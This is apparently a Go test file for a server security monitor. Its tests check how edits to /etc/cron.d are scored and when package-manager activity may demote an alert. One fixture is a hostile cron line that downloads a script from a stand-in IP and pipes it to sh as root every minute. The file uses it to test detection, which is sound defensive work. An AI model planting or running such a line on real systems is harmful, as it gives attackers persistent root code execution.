package checks

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/alert"
	"github.com/pidginhost/csm/internal/config"
)

// cronDChangeHarness drives CheckCrontabs over a single /etc/cron.d file whose
// stored hash no longer matches content.
func cronDChangeHarness(t *testing.T, path string, content []byte) []alert.Finding {
	t.Helper()
	return cronDProvenanceHarness(t, path, content, false)
}

func cronDProvenanceHarness(t *testing.T, path string, content []byte, added bool) []alert.Finding {
	t.Helper()
	store := newCrontabTestStore(t)
	if added {
		store.SetRaw(cronDBaselineKey, "1")
	} else {
		store.SetRaw("_crond:"+filepath.Base(path), hashBytes([]byte("the previous job\n")))
	}
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/etc/cron.d/*" {
				return []string{path}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{path: time.Now()}),
		readFile: func(name string) ([]byte, error) {
			if name == path {
				return content, nil
			}
			return nil, os.ErrNotExist
		},
	})
	return CheckCrontabs(context.Background(), &config.Config{}, store)
}

func cronDFinding(t *testing.T, findings []alert.Finding) alert.Finding {
	t.Helper()
	for _, f := range findings {
		if f.Check == "crond_change" {
			return f
		}
	}
	t.Fatalf("no crond_change finding in %+v", findings)
	return alert.Finding{}
}

// The scheduled cron.d diff and the realtime write detector see the same file.
// Scoring the diff High while the write is demoted means a package upgrade or
// a panel maintenance run pages every night through whichever detector wins.
func TestCronDChangeDemotedByPackageWindow(t *testing.T) {
	dir := t.TempDir()
	pkgLog := filepath.Join(dir, "dnf.rpm.log")
	if err := os.WriteFile(pkgLog, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{pkgLog}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })

	got := cronDFinding(t, cronDChangeHarness(t, "/etc/cron.d/cloudlinux-cron", []byte("0 1 * * * root /usr/sbin/cloudlinux-update\n")))
	if got.Severity != alert.Warning {
		t.Fatalf("severity = %v, want Warning during a package window", got.Severity)
	}
}

// A demotion that swallowed persistence would be worse than the noise. The
// cron danger tokens veto the provenance demote here exactly as they do for a
// realtime write.
func TestCronDChangeWithDangerTokensStaysHigh(t *testing.T) {
	dir := t.TempDir()
	pkgLog := filepath.Join(dir, "dnf.rpm.log")
	if err := os.WriteFile(pkgLog, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{pkgLog}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })

	got := cronDFinding(t, cronDChangeHarness(t, "/etc/cron.d/cloudlinux-cron", []byte("* * * * * root curl http://198.51.100.7/x | sh\n")))
	if got.Severity != alert.High {
		t.Fatalf("severity = %v, want High: persistence tokens veto the demote", got.Severity)
	}
}

// With no package activity and no trusted ancestry there is nothing to demote
// on, so an edited cron.d file keeps reporting at High.
func TestCronDChangeWithoutProvenanceStaysHigh(t *testing.T) {
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{filepath.Join(t.TempDir(), "missing.log")}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })
	oldProbe := AncestryProvenance
	AncestryProvenance = nil
	t.Cleanup(func() { AncestryProvenance = oldProbe })

	got := cronDFinding(t, cronDChangeHarness(t, "/etc/cron.d/cloudlinux-cron", []byte("0 1 * * * root /usr/sbin/cloudlinux-update\n")))
	if got.Severity != alert.High {
		t.Fatalf("severity = %v, want High with no provenance evidence", got.Severity)
	}
}

func TestCronDAddedProvenanceAndDangerVeto(t *testing.T) {
	pkgLog := filepath.Join(t.TempDir(), "package.log")
	if err := os.WriteFile(pkgLog, []byte("transaction\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	oldLogs := pkgManagerLogs
	pkgManagerLogs = []string{pkgLog}
	t.Cleanup(func() { pkgManagerLogs = oldLogs })
	for _, tc := range []struct {
		name, content string
		want          alert.Severity
	}{
		{"benign", "0 1 * * * root /usr/sbin/maintenance\n", alert.Warning},
		{"dangerous", "* * * * * root /tmp/job\n", alert.High},
	} {
		t.Run(tc.name, func(t *testing.T) {
			const path = "/etc/cron.d/new-job"
			findings := cronDProvenanceHarness(t, path, []byte(tc.content), true)
			if len(findings) != 1 {
				t.Fatalf("want exactly one finding, got %+v", findings)
			}
			got := findings[0]
			if got.Check != "crond_change" || got.Message != "Cron.d file added: "+path || got.Severity != tc.want {
				t.Fatalf("finding = %+v; want added cron finding at %v", got, tc.want)
			}
		})
	}
}
